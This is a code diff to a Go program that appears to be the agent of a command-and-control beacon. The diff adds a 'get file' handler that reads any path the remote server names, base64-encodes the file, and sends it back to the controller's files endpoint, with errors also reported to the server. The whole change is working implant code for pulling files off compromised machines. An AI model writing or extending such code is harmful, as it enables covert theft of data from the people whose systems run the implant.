@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -276,7 +277,35 @@ func processBeaconResponse(callback types.StzCallback, dataList []types.StzBeaco
 			case types.StzActionGet:
 				// Format in payload is
 				// "PATH_TO_GET"
-				log.Println("Get file")
+				filePath := data.Payload
+				fileContent, err := os.ReadFile(filePath)
+				if err != nil {
+					// If error reading file, send error message back to server
+					confirm := types.StzExecutionStatus{
+						Status: types.StzStatusDone,
+						UUID:   config.UUID,
+						ID:     data.ID,
+						Data:   fmt.Sprintf("Error reading file: %s", err),
+					}
+					err = sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
+					if err != nil && !_silence {
+						log.Println(err)
+					}
+					return
+				}
+				// Encode file content in base64
+				encodedContent := base64.StdEncoding.EncodeToString(fileContent)
+				// Confirm command execution with encoded file content
+				confirm := types.StzExecutionStatus{
+					Status: types.StzStatusDone,
+					UUID:   config.UUID,
+					ID:     data.ID,
+					Data:   encodedContent,
+				}
+				err = sendHTTPExecution(callback.Endpoints[callbacks.FilesEndpoint], confirm)
+				if err != nil && !_silence {
+					log.Println(err)
+				}
 			case types.StzActionPut:
 				// Format in payload is
 				// "FILE_URL|PATH_TO_PUT"
